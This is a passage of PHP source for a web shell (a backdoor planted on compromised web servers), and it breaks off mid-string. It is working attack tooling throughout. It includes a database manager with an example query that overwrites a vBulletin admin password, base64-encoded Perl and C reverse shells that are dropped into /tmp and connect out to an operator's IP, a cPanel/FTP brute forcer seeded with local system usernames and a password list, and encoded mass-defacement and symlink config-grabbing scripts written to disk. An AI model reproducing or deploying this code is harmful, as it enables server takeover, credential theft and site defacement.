		$dbform .= "<input type=\"hidden\" id=\"charset\" name=\"charset\" value=\"$charset\" />\n";
	}

	if ($doing == 'backupmysql' && $saveasfile) {
		if (!$table) {
			m('Please choose the table');
		} else {
			dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
			$table = array_flip($table);
			$fp = @fopen($path,'w');
			if ($fp) {
				$result = q('SHOW tables');
				if (!$result) p('<h2>'.mysql_error().'</h2>');
				$mysqldata = '';
				while ($currow = mysql_fetch_array($result)) {
					if (isset($table[$currow[0]])) {
						sqldumptable($currow[0], $fp);
					}
				}
				fclose($fp);
				$fileurl = str_replace(SA_ROOT,'',$path);
				m('Database has success backup to <a href="'.$fileurl.'" target="_blank">'.$path.'</a>');
				mysql_close();
			} else {
				m('Backup failed');
			}
		}
	}
	if ($insert && $insertsql) {
		$keystr = $valstr = $tmp = '';
		foreach($insertsql as $key => $val) {
			if ($val) {
				$keystr .= $tmp.$key;
				$valstr .= $tmp."'".addslashes($val)."'";
				$tmp = ',';
			}
		}
		if ($keystr && $valstr) {
			dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
			m(q("INSERT INTO $tablename ($keystr) VALUES ($valstr)") ? 'Insert new record of success' : mysql_error());
		}
	}
	if ($update && $insertsql && $base64) {
		$valstr = $tmp = '';
		foreach($insertsql as $key => $val) {
			$valstr .= $tmp.$key."='".addslashes($val)."'";
			$tmp = ',';
		}
		if ($valstr) {
			$where = base64_decode($base64);
			dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
			m(q("UPDATE $tablename SET $valstr WHERE $where LIMIT 1") ? 'Record updating' : mysql_error());
		}
	}
	if ($doing == 'del' && $base64) {
		$where = base64_decode($base64);
		$delete_sql = "DELETE FROM $tablename WHERE $where";
		dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
		m(q("DELETE FROM $tablename WHERE $where") ? 'Deletion record of success' : mysql_error());
	}

	if ($tablename && $doing == 'drop') {
		dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
		if (q("DROP TABLE $tablename")) {
			m('Drop table of success');
			$tablename = '';
		} else {
			m(mysql_error());
		}
	}

	$charsets = array(''=>'Default','gbk'=>'GBK', 'big5'=>'Big5', 'utf8'=>'UTF-8', 'latin1'=>'Latin1');

	formhead(array('title'=>'MYSQL Manager'));
	makehide('action','sqladmin');
	p('<p>');
	p('DBHost:');
	makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
	p(':');
	makeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));
	p('DBUser:');
	makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));
	p('DBPass:');
	makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));
	p('DBCharset:');
	makeselect(array('name'=>'charset','option'=>$charsets,'selected'=>$charset));
	makeinput(array('name'=>'connect','value'=>'Connect','type'=>'submit','class'=>'bt'));
	p('</p>');
	formfoot();
?>

<script type="text/javascript">
function editrecord(action, base64, tablename){
	if (action == 'del') {
		if (!confirm('Is or isn\'t deletion record?')) return;
	}
	$('recordlist').doing.value=action;
	$('recordlist').base64.value=base64;
	$('recordlist').tablename.value=tablename;
	$('recordlist').submit();
}
function moddbname(dbname) {
	if(!dbname) return;
	$('setdbname').dbname.value=dbname;
	$('setdbname').submit();
}
function settable(tablename,doing,page) {
	if(!tablename) return;
	if (doing) {
		$('settable').doing.value=doing;
	}
	if (page) {
		$('settable').page.value=page;
	}
	$('settable').tablename.value=tablename;
	$('settable').submit();
}
</script>
<?php
	// SQL
	formhead(array('name'=>'recordlist'));
	makehide('doing');
	makehide('action','sqladmin');
	makehide('base64');
	makehide('tablename');
	p($dbform);
	formfoot();

	// Data
	formhead(array('name'=>'setdbname'));
	makehide('action','sqladmin');
	p($dbform);
	if (!$dbname) {
		makehide('dbname');
	}
	formfoot();


	formhead(array('name'=>'settable'));
	makehide('action','sqladmin');
	p($dbform);
	makehide('tablename');
	makehide('page',$page);
	makehide('doing');
	formfoot();

	$cachetables = array();
	$pagenum = 30;
	$page = intval($page);
	if($page) {
		$start_limit = ($page - 1) * $pagenum;
	} else {
		$start_limit = 0;
		$page = 1;
	}
	if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
		dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
		// get mysql server
		$mysqlver = mysql_get_server_info();
		p('<p>MySQL '.$mysqlver.' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');
		$highver = $mysqlver > '4.1' ? 1 : 0;

		// Show database
		$query = q("SHOW DATABASES");
		$dbs = array();
		$dbs[] = '-- Select a database --';
		while($db = mysql_fetch_array($query)) {
			$dbs[$db['Database']] = $db['Database'];
		}
		makeselect(array('title'=>'Please select a database:','name'=>'db[]','option'=>$dbs,'selected'=>$dbname,'onchange'=>'moddbname(this.options[this.selectedIndex].value)','newline'=>1));
		$tabledb = array();
		if ($dbname) {
			p('<p>');
			p('Current dababase: <a href="javascript:moddbname(\''.$dbname.'\');">'.$dbname.'</a>');
			if ($tablename) {
				p(' | Current Table: <a href="javascript:settable(\''.$tablename.'\');">'.$tablename.'</a> [ <a href="javascript:settable(\''.$tablename.'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$tablename.'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$tablename.'\', \'drop\');">Drop</a> ]');
			}
			p('</p>');
			mysql_select_db($dbname);

			$getnumsql = '';
			$runquery = 0;
			if ($sql_query) {
				$runquery = 1;
			}
			$allowedit = 0;
			if ($tablename && !$sql_query) {
				$sql_query = "SELECT * FROM $tablename";
				$getnumsql = $sql_query;
				$sql_query = $sql_query." LIMIT $start_limit, $pagenum";
				$allowedit = 1;
			}
			p('<form action="'.$self.'" method="POST">');
			p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database <font color=red><b>'.$dbname.'</font></b>:<BR>Example VBB Password: <font color=red>vbateam</font><BR><font color=yellow>UPDATE `user` SET `password` = \'69e53e5ab9536e55d31ff533aefc4fbe\', salt = \'p5T\' WHERE `userid` = \'1\' </font>

			</td></tr><tr><td><textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">'.htmlspecialchars($sql_query,ENT_QUOTES).'</textarea></td><td style="padding:0 5px;"><input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /></td></tr></table></p>');
			makehide('tablename', $tablename);
			makehide('action','sqladmin');
			p($dbform);
			p('</form>');
			if ($tablename || ($runquery && $sql_query)) {
				if ($doing == 'structure') {
					$result = q("SHOW COLUMNS FROM $tablename");
					$rowdb = array();
					while($row = mysql_fetch_array($result)) {
						$rowdb[] = $row;
					}
					p('<table border="0" cellpadding="3" cellspacing="0">');
					p('<tr class="head">');
					p('<td>Field</td>');
					p('<td>Type</td>');
					p('<td>Null</td>');
					p('<td>Key</td>');
					p('<td>Default</td>');
					p('<td>Extra</td>');
					p('</tr>');
					foreach ($rowdb as $row) {
						$thisbg = bg();
						p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
						p('<td>'.$row['Field'].'</td>');
						p('<td>'.$row['Type'].'</td>');
						p('<td>'.$row['Null'].'&nbsp;</td>');
						p('<td>'.$row['Key'].'&nbsp;</td>');
						p('<td>'.$row['Default'].'&nbsp;</td>');
						p('<td>'.$row['Extra'].'&nbsp;</td>');
						p('</tr>');
					}
					tbfoot();
				} elseif ($doing == 'insert' || $doing == 'edit') {
					$result = q('SHOW COLUMNS FROM '.$tablename);
					while ($row = mysql_fetch_array($result)) {
						$rowdb[] = $row;
					}
					$rs = array();
					if ($doing == 'insert') {
						p('<h2>Insert new line in '.$tablename.' table &raquo;</h2>');
					} else {
						p('<h2>Update record in '.$tablename.' table &raquo;</h2>');
						$where = base64_decode($base64);
						$result = q("SELECT * FROM $tablename WHERE $where LIMIT 1");
						$rs = mysql_fetch_array($result);
					}
					p('<form method="post" action="'.$self.'">');
					p($dbform);
					makehide('action','sqladmin');
					makehide('tablename',$tablename);
					p('<table border="0" cellpadding="3" cellspacing="0">');
					foreach ($rowdb as $row) {
						if ($rs[$row['Field']]) {
							$value = htmlspecialchars($rs[$row['Field']]);
						} else {
							$value = '';
						}
						$thisbg = bg();
						p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
						p('<td><b>'.$row['Field'].'</b><br />'.$row['Type'].'</td><td><textarea class="area" name="insertsql['.$row['Field'].']" style="width:500px;height:60px;overflow:auto;">'.$value.'</textarea></td></tr>');
					}
					if ($doing == 'insert') {
						p('<tr class="fout"><td colspan="2"><input class="bt" type="submit" name="insert" value="Insert" /></td></tr>');
					} else {
						p('<tr class="fout"><td colspan="2"><input class="bt" type="submit" name="update" value="Update" /></td></tr>');
						makehide('base64', $base64);
					}
					p('</table></form>');
				} else {
					$querys = @explode(';',$sql_query);
					foreach($querys as $num=>$query) {
						if ($query) {
							p("<p><b>Query#{$num} : ".htmlspecialchars($query,ENT_QUOTES)."</b></p>");
							switch(qy($query))
							{
								case 0:
									p('<h2>Error : '.mysql_error().'</h2>');
									break;
								case 1:
									if (strtolower(substr($query,0,13)) == 'select * from') {
										$allowedit = 1;
									}
									if ($getnumsql) {
										$tatol = mysql_num_rows(q($getnumsql));
										$multipage = multi($tatol, $pagenum, $page, $tablename);
									}
									if (!$tablename) {
										$sql_line = str_replace(array("\r", "\n", "\t"), array(' ', ' ', ' '), trim(htmlspecialchars($query)));
										$sql_line = preg_replace("/\/\*[^(\*\/)]*\*\//i", " ", $sql_line);
										preg_match_all("/from\s+`{0,1}([\w]+)`{0,1}\s+/i",$sql_line,$matches);
										$tablename = $matches[1][0];
									}
									$result = q($query);
									p($multipage);
									p('<table border="0" cellpadding="3" cellspacing="0">');
									p('<tr class="head">');
									if ($allowedit) p('<td>Action</td>');
									$fieldnum = @mysql_num_fields($result);
									for($i=0;$i<$fieldnum;$i++){
										$name = @mysql_field_name($result, $i);
										$type = @mysql_field_type($result, $i);
										$len = @mysql_field_len($result, $i);
										p("<td nowrap>$name<br><span>$type($len)</span></td>");
									}
									p('</tr>');
									while($mn = @mysql_fetch_assoc($result)){
										$thisbg = bg();
										p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
										$where = $tmp = $b1 = '';
										foreach($mn as $key=>$inside){
											if ($inside) {
												$where .= $tmp.$key."='".addslashes($inside)."'";
												$tmp = ' AND ';
											}
											$b1 .= '<td nowrap>'.html_clean($inside).'&nbsp;</td>';
										}
										$where = base64_encode($where);
										if ($allowedit) p('<td nowrap><a href="javascript:editrecord(\'edit\', \''.$where.'\', \''.$tablename.'\');">Edit</a> | <a href="javascript:editrecord(\'del\', \''.$where.'\', \''.$tablename.'\');">Del</a></td>');
										p($b1);
										p('</tr>');
										unset($b1);
									}
									tbfoot();
									p($multipage);
									break;
								case 2:
									$ar = mysql_affected_rows();
									p('<h2>affected rows : <b>'.$ar.'</b></h2>');
									break;
							}
						}
					}
				}
			} else {
				$query = q("SHOW TABLE STATUS");
				$table_num = $table_rows = $data_size = 0;
				$tabledb = array();
				while($table = mysql_fetch_array($query)) {
					$data_size = $data_size + $table['Data_length'];
					$table_rows = $table_rows + $table['Rows'];
					$table['Data_length'] = sizecount($table['Data_length']);
					$table_num++;
					$tabledb[] = $table;
				}
				$data_size = sizecount($data_size);
				unset($table);
				p('<table border="0" cellpadding="0" cellspacing="0">');
				p('<form action="'.$self.'" method="POST">');
				makehide('action','sqladmin');
				p($dbform);
				p('<tr class="head">');
				p('<td width="2%" align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td>');
				p('<td>Name</td>');
				p('<td>Rows</td>');
				p('<td>Data_length</td>');
				p('<td>Create_time</td>');
				p('<td>Update_time</td>');
				if ($highver) {
					p('<td>Engine</td>');
					p('<td>Collation</td>');
				}
				p('</tr>');
				foreach ($tabledb as $key => $table) {
					$thisbg = bg();
					p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
					p('<td align="center" width="2%"><input type="checkbox" name="table[]" value="'.$table['Name'].'" /></td>');
					p('<td><a href="javascript:settable(\''.$table['Name'].'\');">'.$table['Name'].'</a> [ <a href="javascript:settable(\''.$table['Name'].'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'drop\');">Drop</a> ]</td>');
					p('<td>'.$table['Rows'].'</td>');
					p('<td>'.$table['Data_length'].'</td>');
					p('<td>'.$table['Create_time'].'</td>');
					p('<td>'.$table['Update_time'].'</td>');
					if ($highver) {
						p('<td>'.$table['Engine'].'</td>');
						p('<td>'.$table['Collation'].'</td>');
					}
					p('</tr>');
				}
				p('<tr class=fout>');
				p('<td>&nbsp;</td>');
				p('<td>Total tables: '.$table_num.'</td>');
				p('<td>'.$table_rows.'</td>');
				p('<td>'.$data_size.'</td>');
				p('<td colspan="'.($highver ? 4 : 2).'">&nbsp;</td>');
				p('</tr>');

				p("<tr class=\"fout\"><td colspan=\"".($highver ? 8 : 6)."\"><input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /> Save as file <input class=\"input\" name=\"path\" value=\"".SA_ROOT.$_SERVER['HTTP_HOST']."_MySQL.sql\" type=\"text\" size=\"60\" /> <input class=\"bt\" type=\"submit\" name=\"downrar\" value=\"Export selection table\" /></td></tr>");
				makehide('doing','backupmysql');
				formfoot();
				p("</table>");
				fr($query);
			}
		}
	}
	tbfoot();
	@mysql_close();
}//end sql backup


elseif ($action == 'backconnect') {
	!$yourip && $yourip = $_SERVER['REMOTE_ADDR'];
	!$yourport && $yourport = '12345';
	$usedb = array('perl'=>'perl','c'=>'c');

	$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
		"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
		"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
		"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
		"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
		"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
		"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
	$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC".
		"BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb".
		"SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd".
		"KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ".
		"sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC".
		"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D".
		"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp".
		"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";

	if ($start && $yourip && $yourport && $use){
		if ($use == 'perl') {
			cf('/tmp/angel_bc',$back_connect);
			$res = execute(which('perl')." /tmp/angel_bc $yourip $yourport &");
		} else {
			cf('/tmp/angel_bc.c',$back_connect_c);
			$res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');
			@unlink('/tmp/angel_bc.c');
			$res = execute("/tmp/angel_bc $yourip $yourport &");
		}
		m("Now script try connect to $yourip port $yourport ...");
	}

	formhead(array('title'=>'Back Connect'));
	makehide('action','backconnect');
	p('<p>');
	p('Your IP:');
	makeinput(array('name'=>'yourip','size'=>20,'value'=>$yourip));
	p('Your Port:');
	makeinput(array('name'=>'yourport','size'=>15,'value'=>$yourport));
	p('Use:');
	makeselect(array('name'=>'use','option'=>$usedb,'selected'=>$use));
	makeinput(array('name'=>'start','value'=>'Start','type'=>'submit','class'=>'bt'));
	p('</p>');
	formfoot();
}//end backconnect window via NC

// Brute
elseif ($action == 'brute') {
formhead(array('title'=>'Brute Forcer'));
	makehide('action','brute');
	makehide('dir',$brute);
@ini_set('memory_limit', 1000000000000);
$connect_timeout=5;
@set_time_limit(0);
$submit = $_REQUEST['submit'];
$users = $_REQUEST['users'];
$pass = $_REQUEST['passwords'];
$target = $_REQUEST['target'];
$option = $_REQUEST['option'];


$passlist = "0123456
01234567
012345678
0123456789
01234567890
123456
1234567
12345678
123456789
1234567890
111111
000000
222222
333333
444444
555555
666666
777777
888888
999999
123123
456456
789789
123321
456654
654321
7654321
87654321
987654321
0987654321
admin
administrator
admincp
cpanel
adminx
admins
password
passwords
passw0rd
p@ssw0rd
p@ssword
khongco
25251325
passw0rds";
if($target == ''){
$target = 'localhost';
}
print " <div align='center'>

<form method='post' style='border: 1px solid #000000'><br><br>
<TABLE style='BORDER-COLLAPSE: collapse' cellSpacing=0 borderColorDark=#966117 cellPadding=5 width='40%' bgColor=#303030 borderColorLight=#966117 border=1><tr><td>
<b> Target  : </font><input type='text' name='target' size='16' value= $target style='border: font-family:tahoma; font-weight:bold;'></p></font></b></p>
<div align='center'><br>
<TABLE style='BORDER-COLLAPSE: collapse' cellSpacing=0 borderColorDark=#966117 cellPadding=5 width='50%' bgColor=#303030 borderColorLight=#966117 border=1>
<tr>
<td align='center'>
<b>Username</b></td>
<td>
<p align='center'>
<b>Password</b></td>
</tr>
</table>

<p align='center'>
<textarea rows='20' name='users' cols='25' style='border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0'>";
$i = 0;
while ($i < 60000) {

    $line = posix_getpwuid($i);
    if (!empty($line)) {

        while (list ($key, $vba_etcpwd) = each($line)){
            echo "".$vba_etcpwd."\n";
            break;
        }

    }

   $i++;
}
echo "
</textarea>
<textarea rows='20' name='passwords' cols='25' style='border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0'>$passlist</textarea><br>
<br>
<b>Options : </span><input name='option' value='cpanel' style='font-weight: 700;' checked type='radio'> cPanel
<input name='option' value='ftp' style='font-weight: 700;' type='radio'> ftp ==> <input type='submit' value='Attack' name='submit' ></p>
</td></tr></table></td></tr></form><p align= 'left'>";
?>
<?php
function ftp_check($host,$user,$pass,$timeout){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "ftp://$host");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);
curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
curl_setopt($ch, CURLOPT_FAILONERROR, 1);
$data = curl_exec($ch);
if ( curl_errno($ch) == 28 ) {

print "<b> Error : Connection timed out , make confidence about validation of target !</b>";
exit;}

elseif ( curl_errno($ch) == 0 ){

p("<b>[ medyed01@yandex.com ]# </b>

<b> Attacking has been done! Username: <font color='#FF0000'> $user </font> / Password:<font color='#FF0000'> $pass </font> => <a href=http://$user:$pass@$host:2082 target=_blank>Login</a></b><br>");
}
curl_close($ch);}

function cpanel_check($host,$user,$pass,$timeout){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://$host:2082");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
curl_setopt($ch, CURLOPT_FAILONERROR, 1);
$data = curl_exec($ch);
if ( curl_errno($ch) == 28 ) {
print "<b> Error : Connection timed out , make confidence about validation of target !</b>";
exit;}
elseif ( curl_errno($ch) == 0 ){

p("<b>[ medyed01@yandex.com ]# </b><b>Attacking has been done!</a> Username: <font color='#FF0000'> $user </font> / Password:<font color='#FF0000'> $pass </font></b><br>");}curl_close($ch);}

if(isset($submit) && !empty($submit)){

$userlist = explode ("\n" , $users );
$passlist = explode ("\n" , $pass );
p('<b>[ medyed01@yandex.com]# Attacking ...</font></b><br>');
foreach ($userlist as $user) {
$_user = trim($user);
foreach ($passlist as $password ) {
$_pass = trim($password);
if($option == "ftp"){
ftp_check($target,$_user,$_pass,$connect_timeout);
}
if ($option == "cpanel")
{
cpanel_check($target,$_user,$_pass,$connect_timeout);
}
}
}
}

	formfoot();
}elseif ($action == 'massdeface') {
        $file       = fopen($dir . "massdeface.php", "w+");
        $perltoolss = 'PD9waHANCi8qDQpTY3JpcHQ6IE1hc3MgRGVmYWNlIFNjcmlwdA0KYXYzbG94aXMuaG9sLmVzDQoqLw0KZWNobyAiPGNlbnRlcj48dGV4dGFyZWEgcm93cz0nMTAnIGNvbHM9JzEwMCc+IjsNCiRkZWZhY2V1cmwgPSAkX1BPU1RbJ21hc3NkZWZhY2V1cmwnXTsNCiRkaXIgPSAkX1BPU1RbJ21hc3NkZWZhY2VkaXInXTsNCmVjaG8gJGRpci4iXG4iOw0KIA0KaWYgKGlzX2RpcigkZGlyKSkgew0KICAgIGlmICgkZGggPSBvcGVuZGlyKCRkaXIpKSB7DQogICAgICAgIHdoaWxlICgoJGZpbGUgPSByZWFkZGlyKCRkaCkpICE9PSBmYWxzZSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoZmlsZXR5cGUoJGRpci4kZmlsZSk9PSJkaXIiKXsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJG5ld2ZpbGU9JGRpci4kZmlsZS4iL2luZGV4LnBocCI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gJG5ld2ZpbGUuIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFjb3B5KCRkZWZhY2V1cmwsICRuZXdmaWxlKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gImZhaWxlZCB0byBjb3B5ICRmaWxlLi4uXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgY2xvc2VkaXIoJGRoKTsNCiAgICB9DQp9DQplY2hvICI8L3RleHRhcmVhPjwvY2VudGVyPiI7DQo/Pg0KPHRkIGFsaWduPXJpZ2h0Pk1hc3MgRGVmYWNlbWVudDo8L3RkPjxicj4NCjxmb3JtIGFjdGlvbj0nPD9waHAgYmFzZW5hbWUoJF9TRVJWRVJbJ1BIUF9TRUxGJ10pOyA/PicgbWV0aG9kPSdwb3N0Jz4NClsrXSBNYWluIERpcmVjdG9yeTogPGlucHV0IHR5cGU9J3RleHQnIHN0eWxlPSd3aWR0aDogMjUwcHgnIHZhbHVlPSc8P3BocCAgZWNobyBnZXRjd2QoKSAuICIvIjsgPz4nIG5hbWU9J21hc3NkZWZhY2VkaXInPg0KWytdIERlZmFjZW1lbnQgVXJsOiA8aW5wdXQgdHlwZT0ndGV4dCcgc3R5bGU9J3dpZHRoOiAyNTBweCcgbmFtZT0nbWFzc2RlZmFjZXVybCc+DQo8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSdleGVjbWFzc2RlZmFjZScgdmFsdWU9J0Jhc3MgR2l0c2luICEnPjwvZm9ybT48L3RkPg0KIA0KIA0KDQo8YnI+PGJyPjxicj4NCioqIEFuYSBEaXppbiA9IGtpdGxlIHRhaHJpZiBpc3RlZGlnaW5peiBkaXppbiBva3VtYSAvICh5YXptYSBpem5pIG9sbWFsaSkgKio8YnI+DQoqKiBEZWZhY2VtZW50IFVybCA9IGluZGV4J2luaXogKGUuZzogaHR0cDovL3NpdGVhZGkuY29tL2RlZmFjZS5odG1sICkgKio8YnI+PGJyPg0KQXYzTG9YaVNAaG90bWFpbC5jb208L2JvZHk+PC9odG1sPg==';
        $file       = fopen("massdeface.php", "w+");
        $write      = fwrite($file, base64_decode($perltoolss));
        fclose($file);
        echo "<iframe src=massdeface.php width=100% height=720px frameborder=0></iframe> ";
 }elseif ($action == 'symlink') {
        $file       = fopen($dir . "symlink.php", "w+");
        $perltoolss = 'IDw/cGhwDQoNCg0KICRoZWFkID0gJw0KPGh0bWw+DQo8aGVhZD4NCjwvc2NyaXB0Pg0KPHRpdGxlPi0tPT1bW1N5bSBsam5rIEFMbCBDb25GaWcgKyBTeW0gUm9vdCBieSBLeW0gTGpua11dPT0tLTwvdGl0bGU+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+DQoNCjxTVFlMRT4NCmJvZHkgew0KZm9udC1mYW1pbHk6IFRhaG9tYQ0KfQ0KdHIgew0KQk9SREVSOiBkYXNoZWQgMXB4ICMzMzM7DQpjb2xvcjogI0ZGRjsNCn0NCnRkIHsNCkJPUkRFUjogZGFzaGVkIDFweCAjMzMzOw0KY29sb3I6ICNGRkY7DQp9DQoudGFibGUxIHsNCkJPUkRFUjogMHB4IEJsYWNrOw0KQkFDS0dST1VORC1DT0xPUjogQmxhY2s7DQpjb2xvcjogI0ZGRjsNCn0NCi50ZDEgew0KQk9SREVSOiAwcHg7DQpCT1JERVItQ09MT1I6ICMzMzMzMzM7DQpmb250OiA3cHQgVmVyZGFuYTsNCmNvbG9yOiBHcmVlbjsNCn0NCi50cjEgew0KQk9SREVSOiAwcHg7DQpCT1JERVItQ09MT1I6ICMzMzMzMzM7DQpjb2xvcjogI0ZGRjsNCn0NCnRhYmxlIHsNCkJPUkRFUjogZGFzaGVkIDFweCAjMzMzOw0KQk9SREVSLUNPTE9SOiAjMzMzMzMzOw0KQkFDS0dST1VORC1DT0xPUjogQmxhY2s7DQpjb2xvcjogI0ZGRjsNCn0NCmlucHV0IHsNCmJvcmRlciAgIDogZGFzaGVkIDFweDsNCmJvcmRlci1jb2xvciAgOiAjMzMzOw0KQkFDS0dST1VORC1DT0xPUjogQmxhY2s7DQpmb250OiA4cHQgVmVyZGFuYTsNCmNvbG9yOiBSZWQ7DQp9DQpzZWxlY3Qgew0KQk9SREVSLVJJR0hUOiAgQmxhY2sgMXB4IHNvbGlkOw0KQk9SREVSLVRPUDogICAgI0RGMDAwMCAxcHggc29saWQ7DQpCT1JERVItTEVGVDogICAjREYwMDAwIDFweCBzb2xpZDsNCkJPUkRFUi1CT1RUT006IEJsYWNrIDFweCBzb2xpZDsNCkJPUkRFUi1jb2xvcjogI0ZGRjsNCkJBQ0tHUk9VTkQtQ09MT1I6IEJsYWNrOw0KZm9udDogOHB0IFZlcmRhbmE7DQpjb2xvcjogUmVkOw0KfQ0Kc3VibWl0IHsNCkJPUkRFUjogIGJ1dHRvbmhpZ2hsaWdodCAycHggb3V0c2V0Ow0KQkFDS0dST1VORC1DT0xPUjogQmxhY2s7DQp3aWR0aDogMzAlOw0KY29sb3I6ICNGRkY7DQp9DQp0ZXh0YXJlYSB7DQpib3JkZXIgICA6IGRhc2hlZCAxcHggIzMzMzsNCkJBQ0tHUk9VTkQtQ09MT1I6IEJsYWNrOw0KZm9udDogRml4ZWRzeXMgYm9sZDsNCmNvbG9yOiAjOTk5Ow0KfQ0KQk9EWSB7DQogU0NST0xMQkFSLUZBQ0UtQ09MT1I6IEJsYWNrOyBTQ1JPTExCQVItSElHSExJR0hULWNvbG9yOiAjRkZGOyBTQ1JPTExCQVItU0hBRE9XLWNvbG9yOiAjRkZGOyBTQ1JPTExCQVItM0RMSUdIVC1jb2xvcjogI0ZGRjsgU0NST0xMQkFSLUFSUk9XLUNPTE9SOiBCbGFjazsgU0NST0xMQkFSLVRSQUNLLWNvbG9yOiAjRkZGOyBTQ1JPTExCQVItREFSS1NIQURPVy1jb2xvcjogI0ZGRg0KbWFyZ2luOi